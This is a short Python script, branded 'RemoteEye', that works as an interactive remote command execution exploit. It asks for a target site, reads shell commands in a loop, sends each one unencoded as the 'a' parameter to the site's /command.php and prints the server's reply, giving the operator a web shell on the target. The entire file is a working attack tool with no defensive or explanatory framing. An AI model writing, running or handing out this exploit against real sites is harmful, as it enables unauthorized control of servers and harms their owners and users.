import subprocess
import requests
import sys
import os

os.system("clear")

os.system("figlet RemoteEye")
print("Author : AkkuS3T10")
def _main_():
    try:
        url = input("[+] Site Name: ")
        _exploit(url)
    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
    
def _exploit(url):
    command = input("$ ")
    payload =url+ "/command.php?a="+command
    try:
        r=requests.get(payload)
        r.raise_for_status()
        print(r.text)
        _exploit(url)
    except(requests.exceptions.ConnectionError,requests.exceptions.ConnectTimeout):
        print("Connection Error")
    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
            
_main_()
